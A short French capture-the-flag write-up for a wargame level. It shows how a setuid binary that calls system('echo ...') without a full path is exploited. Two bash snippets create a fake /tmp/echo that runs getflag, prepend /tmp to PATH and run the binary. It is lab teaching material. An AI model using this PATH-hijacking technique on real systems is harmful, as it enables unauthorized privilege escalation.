# Level03

---

- On telecharge l'executable, puis on utilise des outils de reverse engineering pour observer le code tel que :
	- [Dogbolt](https://dogbolt.org/)
	- [Ghidra](https://www.ghidra-sre.org/)

- On peut observer plusieurs choses:
	1.  Le programme change le UID et GID.
	2.  La fonction "system" est appele
	3.  La fonction systeme utilise la commande bash "echo"

- Du fait de l'utilisation de l'env du systeme, on peut creer notre propre "echo" dans le dossier /tmp :
	```bash
	echo "/bin/getflag" > /tmp/echo
	chmod +x /tmp/echo
	export PATH=/tmp:$PATH
	./level03
	```
	ou bien
	```bash
	cp /bin/getflag /tmp/echo
	export PATH=/tmp:$PATH
	./level03
	```

- On obtient donc le flag de ce niveau.